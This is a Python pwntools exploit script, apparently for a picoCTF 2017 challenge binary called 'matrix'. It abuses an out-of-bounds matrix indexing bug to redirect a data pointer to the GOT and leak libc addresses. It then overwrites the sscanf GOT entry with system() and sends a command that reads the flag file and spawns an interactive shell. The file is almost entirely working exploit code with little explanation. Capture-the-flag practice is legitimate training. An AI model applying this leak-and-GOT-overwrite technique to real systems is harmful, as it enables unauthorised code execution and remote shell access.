#!/usr/bin/python
import re
import sys
import time
import argparse
from pwn import *

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'
regex=r".*Matrix #(?P<id>\d+): (?P<rows>\d+) row.*, (?P<cols>\d+) column.*"

normalization = [
    {'mask': 0x1<<22, 'value': 1.0/(2)},
    {'mask': 0x1<<21, 'value': 1.0/(2<<1)},
    {'mask': 0x1<<20, 'value': 1.0/(2<<2)},
    {'mask': 0x1<<19,  'value': 1.0/(2<<3)},
    {'mask': 0x1<<18,  'value': 1.0/(2<<4)},
    {'mask': 0x1<<17,  'value': 1.0/(2<<5)},
    {'mask': 0x1<<16,  'value': 1.0/(2<<6)},
    {'mask': 0x1<<15,  'value': 1.0/(2<<7)},
    {'mask': 0x1<<14,  'value': 1.0/(2<<8)},
    {'mask': 0x1<<13,  'value': 1.0/(2<<9)},
    {'mask': 0x1<<12, 'value': 1.0/(2<<10)},
    {'mask': 0x1<<11, 'value': 1.0/(2<<11)},
    {'mask': 0x1<<10, 'value': 1.0/(2<<12)},
    {'mask': 0x1<<9, 'value': 1.0/(2<<13)},
    {'mask': 0x1<<8, 'value': 1.0/(2<<14)},
    {'mask': 0x1<<7, 'value': 1.0/(2<<15)},
    {'mask': 0x1<<6, 'value': 1.0/(2<<16)},
    {'mask': 0x1<<5, 'value': 1.0/(2<<17)},
    {'mask': 0x1<<4, 'value': 1.0/(2<<18)},
    {'mask': 0x1<<3, 'value': 1.0/(2<<19)},
    {'mask': 0x1<<2, 'value': 1.0/(2<<20)},
    {'mask': 0x1<<1, 'value': 1.0/(2<<21)},
    {'mask': 0x1<<0, 'value': 1.0/(2<<22)},
]

def hex2float(val):

  #addr_as_float = struct.unpack('<f', struct.pack('<I', address))[0]

  s = (( 0x80000000 & val ) >> 31)
  e = (( 0x7F800000 & val ) >> 23) - 127
  m = ( 0x007FFFFF & val )

  realm = 1.0
  for v in normalization:
    if m & v['mask']:
      realm += v['value']

  tmp = (0x7F800000 & val) >> 23
  #print "sign: %d" %s
  #print "exp:  %d" %tmp
  #print "exp:  %d" %e
  #print hex(m)
  #print realm
  #print realm*(2**e)
  ret = realm*(2**e)
  if s:
   ret = 0-ret
  return ret


def wait_for_prompt(r):
  print r.recvuntil("Enter command: ")
  #r.recvuntil("Your choice :")

def wait_newline_and_dump(r):
  data = r.recvuntil('\n')
  if data:
    print data.encode('hex')
    print data
  return data


def create(r, rows, cols):
  print r.sendline("create %s %s" %(str(rows),str(cols)))
  print r.recvuntil("Successfully created matrix ")

def destroy(r, m_id):
  print r.sendline("destroy %s" %(str(m_id)))
  print r.recvuntil("Successfully destroyed matrix ")

def get(r, m_id, row, col):
  r.clean(0)
  r.sendline("get %s %s %s" %(m_id, row, col))
  r.recvuntil(" = ")
  data = r.recvuntil('\n').rstrip().lstrip()
  return data
  
def set(r, m_id, row, col, val):
  print r.sendline("set %s %s %s %s" %(m_id, row, col, val))
  print r.recvuntil("Successfully set matrix")

def dump_matrix(r, m_id):
  print r.sendline("list")
  print r.recvuntil("Enter command")
  while(True):
    data = r.recvuntil("\n").rstrip().lstrip()
    m = re.match(regex,data)
    if m:
      this_id = m.groupdict()['id']
      rows = int(m.groupdict()['rows'])
      cols = int(m.groupdict()['cols'])
      if int(this_id) == int(m_id):
        for row in range(rows):
          for col in range(cols):
            value = get(r, this_id, row, col)
            print "#%s [%d][%d] = %s" %(this_id, row, col, value)
        
        break
  print '-'*80

def float2hex(c, addr_as_float):
  address = struct.unpack('<I', struct.pack('<f', float(addr_as_float)))[0]
  return address

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  parser.add_argument('--remote', '-r', action="store_true")
  args = parser.parse_args()

  c = process('./float2hex')

  libc_path = './libc_remote.so.6'

  if args.remote:
    r = remote('shell2017.picoctf.com', 57222)
  else:
    r = process('./matrix', env={"LD_PRELOAD":libc_path})
    #r = process('./matrix')

  libc = ELF(libc_path)

  if args.dbg:
    gdb.attach(r)

  GOT_ADDR = 0x804a0f8
  GOT_ADDR_AS_FLOATREP = hex2float(GOT_ADDR)

  """
Available operations:
	create <rows> <cols>
	destroy <id>
	list
	print <id>
	get <id> <row> <col>
	set <id> <row> <col> <value>
	help
	quit
Enter command: d 0
  """

  wait_for_prompt(r)

  create(r, 4, 1)
  create(r, 1, 10000)

  #dump_matrix(r, 0) 

  # Our overlap is here due to the bug: "m->data[r * m->nrows + c]"
  val = get(r, 0, 2, 0)
  # this will be the pointer to data for matrix #1
  print hex(float2hex(c, val))
 
  # Need to now set this pointer to point to the GOT
  set(r, 0, 2, 0, GOT_ADDR_AS_FLOATREP)
  
  val = get(r, 0, 2, 0)
  print hex(float2hex(c, val))
  print '-'*80 

  #Debug, dump GOT
  for i in range(10):
    val = get(r, 1, 0, i)
    print hex(float2hex(c, val))
  print '-'*80 
  

  leak_setbuf = float2hex(c, get(r, 1, 0, 3))
  print " leak of setbuf: " + hex(leak_setbuf)

  libc.address = leak_setbuf - libc.symbols['setbuf']
  print "LIBC Base: 0x%x " %libc.address

  leak_sscanf = float2hex(c, get(r, 1, 0, 13))
  print "LIBC sscanf 0x%x should be 0x%x" %(leak_sscanf, libc.symbols['__isoc99_sscanf'])

  # get the float representation of system()
  floatrep_system = hex2float( libc.symbols['system'] )
  # overwrite GOT entry to point to system
  set(r, 1, 0, 13, floatrep_system)

  #Next command should be passed to system() as is
  r.sendline("echo FLAG; cat ./flag.txt; /bin/sh -i")

  # Drop to interactive console
  r.interactive()



